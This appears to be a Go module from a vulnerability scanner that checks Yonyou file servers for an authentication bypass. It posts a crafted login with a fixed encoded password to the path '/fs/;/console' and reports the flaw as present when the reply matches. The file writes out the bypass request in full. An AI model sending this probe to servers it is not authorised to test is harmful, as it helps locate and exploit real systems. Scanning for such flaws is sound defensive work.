package fs_dlbypass

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/fs/;/console"
	resp, err := client.R().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent": UA,
		}).
		SetFormData(map[string]string{
			"operType": "login",
			"username": "123",
			"password": "%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D",
		}).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 文件服务器 认证绕过漏洞不存在")
		return
	}
	if strings.Contains(resp.String(), "{\"login\":\"false\"}") {
		color.Green.Println("[+] 用友 文件服务器 认证绕过漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 文件服务器 认证绕过漏洞不存在")
}
